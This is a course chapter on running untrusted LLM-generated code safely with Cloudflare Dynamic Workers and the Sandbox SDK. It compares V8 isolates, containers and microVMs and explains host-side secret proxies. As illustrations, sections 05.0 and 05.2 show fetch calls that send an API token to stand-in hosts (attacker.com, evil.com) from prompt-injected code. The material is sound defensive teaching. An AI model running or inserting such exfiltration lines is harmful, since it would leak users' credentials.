# Chapter 05 — Dynamic Workers & Sandbox Isolation

> **Lecture 31 · Chapter 05 of 08** · Level: 🟠 Advanced · Phase 7 — Connectors, Code Mode & Proactive Workflows
> **Source:** `Cloudflare Code Mode Blog & Docs` · **Roadmap Reference:** [`roadmap-v1.md`](../../roadmap-v1.md#lecture-31--cloudflare-code-mode--isolated-code-execution-mcp-cloudflarecodemode)
> **Roadmap topics:** Why `eval()` is unsafe · V8 isolates vs. Docker containers · Dynamic Workers (`env.LOADER`) · `globalOutbound: null` · keeping secrets & intermediate loops out of LLM context.

---

## 05.0 What this chapter is for

Code Mode requires running **untrusted, LLM-generated JavaScript/TypeScript on the fly**. Using `eval()` or `new Function()` in your host Node/Worker process is an instant **Remote Code Execution (RCE)** vulnerability — generated code could read `process.env.API_KEY` or `fetch("https://attacker.com/?secret=" + token)`.

On the other hand, booting a fresh Docker container per tool call takes **1–3 seconds** and hundreds of megabytes of RAM. **Cloudflare Dynamic Workers** solve this with **V8 Isolates** that boot in **a few milliseconds** using **a few megabytes of memory**.

By the end of this chapter you should be able to:

1. Compare **V8 Isolates (Dynamic Workers)** vs. **Containers** vs. **MicroVMs** for latency, memory, and isolation.
2. Explain how `globalOutbound: null` blocks arbitrary network exfiltration from inside the sandbox.
3. Explain why **secrets never enter the sandbox** — only host-side RPC proxies hold credentials.

---

## 05.1 V8 Isolates vs. Containers

| Runtime | Cold Start | Memory Overhead | Network Isolation | Best For |
| :--- | :---: | :---: | :--- | :--- |
| **V8 Isolate (Dynamic Worker)** | **~2–5 ms** | **~3–10 MB** | `globalOutbound: null` (zero raw `fetch`) | High-frequency JS/TS Code Mode execution |
| **Container (Docker)** | `500–2,000 ms` | `100–512 MB` | `--network=none` | Arbitrary Python/C++/CLI binaries |
| **MicroVM (Firecracker)** | `120–250 ms` | `50–128 MB` | Hardware-virtualized | Untrusted multi-tenant full OS workloads |

```mermaid
flowchart LR
    subgraph Host["Host Worker (Trusted)"]
        Env["Secrets: env.API_TOKEN"]
        Proxy["RPC Request Proxy<br/>(Allow-lists paths · Injects Auth)"]
    end
    subgraph Sandbox["Dynamic Worker V8 Isolate (Untrusted)"]
        Code["LLM-Generated TS Code"]
        Net["globalOutbound: null<br/>(Raw fetch() BLOCKED!)"]
    end
    Code -->|"RPC Call Only"| Proxy
    Proxy -->|"Authenticated fetch()"| Ext["Enterprise API"]
```

---

## 05.2 Three security invariants of `DynamicWorkerExecutor`

1. **No Ambient Network (`globalOutbound: null`):** Code inside the Dynamic Worker cannot open sockets or `fetch()` arbitrary external URLs — eliminating data exfiltration.
2. **No Secret Access:** `env.API_TOKEN` lives strictly in the Host Worker. The isolate only sees the `codemode.*` or `request()` RPC stub.
3. **Ephemeral State & CPU Caps:** Each execution runs in a fresh, disposable isolate with strict CPU/wall-clock limits, so infinite loops are killed automatically.

### Example: What Happens When Prompt-Injected Code Runs Inside `execute()`
Suppose injected code tries: `await fetch("https://evil.com/?leak=" + process.env.API_TOKEN)`.
1. `process.env.API_TOKEN` is **`undefined`** (secrets never cross into the isolate).
2. `fetch("https://evil.com/...")` **throws immediately** because `globalOutbound: null` disables all direct outbound networking.

---

## 05.3 Cloudflare Sandbox SDK (GA) vs. Dynamic Workers

Cloudflare ships **two distinct sandbox primitives** — choosing the right one depends on whether your agent needs **JS/TS API glue** or a **full Linux OS**:

| Feature | **Dynamic Workers** (`env.LOADER`) | **Cloudflare Sandbox SDK (GA)** (`@cloudflare/sandbox`) |
| :--- | :--- | :--- |
| **Underlying Runtime** | V8 Isolate | Durable Object + Linux Container |
| **Cold Start** | **~2–5 ms** | **~1–2 s** (warm sleep/wake lifecycle) |
| **Languages & Binaries** | JS / TS only | Full Linux (`bash`, `python3`, `git`, `pip`, `npm`, CLI binaries) |
| **Filesystem** | Ephemeral / in-memory | Persistent container filesystem + bucket mounts + backups |
| **Processes & Ports** | Single short-lived `execute()` | `exec()`, `startProcess()`, `terminal()`, **preview URLs** (`exposePort`) |
| **Best For** | Code Mode (`codeMcpServer` / `openApiMcpServer`) | SWE coding agents, Python data analysis, git workflows, OpenAI Agents SDK |

### Wiring `@cloudflare/sandbox` with OpenAI Agents SDK
When an OpenAI Agent needs a persistent Linux workspace (instead of just JS/TS Code Mode), bind a Durable Object `Sandbox` namespace and expose `exec` / `files` / `preview` tools using the stable `@cloudflare/sandbox` contract:

```ts
import { getSandbox, Sandbox } from "@cloudflare/sandbox";
export { Sandbox };

// Bind each user or conversation thread to an isolated Linux container
const sandbox = getSandbox(env.Sandbox, `thread-${threadId}`);
const result = await sandbox.exec('python3 -c "print(2 + 2)"');
// result -> { stdout, stderr, exitCode, success }
```

- **References:** [Cloudflare Sandbox GA](https://blog.cloudflare.com/sandbox-ga/) · [Dynamic Workers](https://blog.cloudflare.com/dynamic-workers/) · [Agents Sandbox Tools](https://developers.cloudflare.com/agents/tools/sandbox/) · [OpenAI Agents + Cloudflare Sandbox Tutorial](https://developers.cloudflare.com/sandbox/sdk/tutorials/openai-agents/)

---

## 05.4 Key takeaways

1. **Dynamic Workers boot in milliseconds** (~100× faster than containers) with strong V8 memory isolation for JS/TS Code Mode.
2. **`globalOutbound: null` + Host RPC Proxy** guarantees zero credential leakage even if prompt-injected code runs inside the sandbox.
3. **Use `@cloudflare/sandbox` (GA)** when the agent needs a **full Linux OS** (`python3`, `bash`, `git`, preview URLs, or OpenAI Agents SDK workspace sessions).

---

**Next:** [Chapter 06 — OAuth 2.1 & Scoped Delegated Execution](./06_OAuth_2_1_and_Scoped_Delegated_Execution.md)

